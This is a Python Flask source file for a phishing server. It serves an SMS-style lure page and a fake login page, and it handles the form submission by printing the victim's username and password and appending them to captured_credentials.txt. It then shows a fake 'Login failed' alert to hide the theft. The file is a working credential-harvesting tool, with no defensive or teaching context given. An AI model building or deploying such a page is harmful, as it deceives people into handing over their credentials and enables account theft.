from flask import Flask, render_template,request

app = Flask(__name__)


@app.route('/')
def sms():
    return render_template('sms.html')


# Fake login page


@app.route('/login', methods=['GET'])
def login():
    return render_template('login.html')  # You must create login.html in "templates" folder

# Handle login form submission
@app.route('/login', methods=['POST'])
def capture_credentials():
    username = request.form.get('username')
    password = request.form.get('password')

    print(f"[🔥 Captured] Username: {username} | Password: {password}")

    # Save to a file (optional)
    with open("captured_credentials.txt", "a") as file:
        file.write(f"Username: {username} | Password: {password}\n")
        return '''
<script>
alert("Login failed. Please try again later.")
window.location.href = "/login"
</script>
'''

if __name__ == '__main__':
    app.run(debug=True)